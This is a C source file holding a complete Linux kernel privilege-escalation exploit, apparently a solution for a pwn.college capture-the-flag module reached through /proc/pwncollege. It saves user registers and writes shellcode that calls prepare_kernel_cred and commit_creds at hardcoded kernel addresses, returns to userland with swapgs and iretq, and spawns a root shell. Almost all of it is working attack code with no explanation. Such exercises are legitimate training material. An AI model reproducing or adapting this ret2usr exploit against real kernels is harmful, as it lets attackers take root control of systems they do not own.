#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    printf("[*] Saved state - CS: %lx, SS: %lx, RFLAGS: %lx, SP: %lx\n", 
           user_cs, user_ss, user_rflags, user_sp);
}

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

// Simpler shellcode using inline assembly approach
void escalate_privs(void){
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rax, 0xffffffff810881d0;" // prepare_kernel_cred
        "xor rdi, rdi;"
        "call rax;" 
        "mov rdi, rax;"
        "movabs rax, 0xffffffff81087e90;" // commit_creds
        "call rax;"
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, offset get_shell;"  // Use label instead of variable
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main() {
    int fd;
    
    save_state();
    
    fd = open("/proc/pwncollege", O_WRONLY);
    if (fd < 0) {
        perror("open");
        exit(-1);
    }
    
    // Get the address of escalate_privs function
    unsigned char *shellcode_ptr = (unsigned char *)escalate_privs;
    
    printf("[*] Writing shellcode at %p\n", shellcode_ptr);
    
    // Write the function's machine code as shellcode
    // Note: This is a bit hacky but works for CTFs
    write(fd, shellcode_ptr, 200);  // Write enough bytes to cover the function
    
    close(fd);
    
    puts("[!] Should never be reached");
    return 0;
}
